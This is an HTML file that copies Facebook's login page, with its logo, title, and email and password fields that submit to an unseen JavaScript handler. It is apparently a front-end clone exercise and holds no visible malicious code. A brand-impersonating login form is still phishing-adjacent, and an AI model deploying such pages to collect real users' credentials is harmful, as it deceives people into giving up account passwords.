<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
        integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="icon" type="image/png" href="images/Facebook_Logo.png">
    <link rel="stylesheet" href="CSS/style.css">
    <title>Facebook - Log in</title>
</head>

<body>
    <div class="left-content">
        <img src="images/facebook-logo.svg">
        <p>Facebook helps you connect and share with the people in your life.</p>
    </div>

    <div class="right-content">
        <form onsubmit="loginHandler(event)">
            <input id="emailInput" type="email" placeholder="Email address or phone number">
            <div>
                <input id="passwordInput" type="password" placeholder="Password">
                <i class="fa-regular fa-eye" id="toggleIcon" onclick="eyeToggle()"></i>
            </div>
           
            <button class="btn1">Log in</button>
            <a href="" class="forget-link">Forgotten password?</a>
            <hr>
            <a href="pages/signup.html" class="btn2">Create new account</a>
        </form>

        <p><span>Create a Page</span> for a celebrity, brand or business.</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="/JS/index.js"></script>
</body>

</html>
